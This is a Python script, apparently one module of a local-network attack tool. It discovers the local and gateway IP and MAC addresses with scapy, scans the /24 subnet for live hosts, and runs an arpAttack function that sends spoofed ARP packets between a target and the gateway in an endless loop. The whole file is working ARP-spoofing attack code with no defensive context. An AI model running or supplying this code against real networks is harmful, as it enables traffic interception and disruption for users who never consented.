import netifaces
import socket
import time, sys, os

from scapy.all import Ether, ARP, srp


from modulesTools.scan import scanNetwork
from modulesTools.spoof import sendpacket


# 获取本机的Ip Mac地址
def getMyIp_Mac():
    myhostname = socket.gethostname()
    myip = socket.gethostbyname(myhostname)
    return myip, getHostMac(myip)

# 获取网关Ip, Mac
def getGateWayIp_Mac():
    gateIp = netifaces.gateways()['default'][netifaces.AF_INET][0]
    getGateMac = getHostMac(gateIp)
    return gateIp, getGateMac

# 获取主机的Mac
def getHostMac(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return False

def onlineIp():
    gateIp, _ = getGateWayIp_Mac()
    networks = gateIp[:-1] + '1/24'
    hostlist = []
    hostlist = scanNetwork(network=networks)
    return hostlist

def arpAttack(my_mac, gateway_ip, target_ip, target_mac, pkt=60):
    try:
        while True:
            sendpacket(my_mac, gateway_ip, target_ip, target_mac)
            if pkt != 100:
                time.sleep(60 / pkt) 
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        os._exit(1)